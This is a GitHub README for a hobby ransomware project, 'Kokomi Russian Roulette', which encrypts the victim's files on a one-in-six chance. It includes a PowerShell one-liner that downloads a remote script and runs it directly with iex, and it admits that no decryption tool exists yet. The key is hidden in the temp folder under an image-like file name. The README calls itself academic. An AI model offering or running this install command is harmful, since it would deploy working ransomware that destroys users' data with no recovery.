# Kokomi Russian Roulette
<p align="center">
<img src="resources/header.png" alt="drawing" width="500"/><br>
</p>

## What is?
It is a simple ransomware, with the idea of being a game inspired by the classic Russian roulette. 6 cabins, 1 chance to be encrypted, would you dare to play?
## Warning
This software is licensed under GPL3. But under no circumstances should it be used for evil. Its purpose is purely academic for the study of malware development. I disclaim any responsibility for misuse of this software.
## Usage
**This script only works in Windows OS, please only perform tests on your own virtual machine.**<br>
<br>
- One line with powershell
```powershell
irm https://raw.githubusercontent.com/quantumwavves/Kokomi-Russian-Roulette/master/bin/oneline/krr-oneline.ps1 | iex
```
- Normal Usage
```powershell
$ .\kokomi-russian-rulette.exe
```
- Dev<br>
  I recommend using a python virtual enviroment
```console
#Install dependecies
$ source env/Scripts/activate
$ pip install -r requirements.txt
$ python krr-fernet.py
```
## Decrypt files
The decryption program is not yet created, but is in process.<br>
KRR creates a random key for each run, this is stored in the $env:temp directory or also known as %temp%. The key is saved as a ``sngmy.png`` file.

## To do list
- [ ] Create decrypter program
- [ ] Optimize execution times
- [ ] Create port for C++ or C
## Inspiration:
- This kokomiware was inspired in [NaGa](https://github.com/ic4rta/NaGa)
- [Sangonomiya Kokomi](https://genshin-impact.fandom.com/wiki/Sangonomiya_Kokomi) (One of my favorite characters from Genshin Impact)
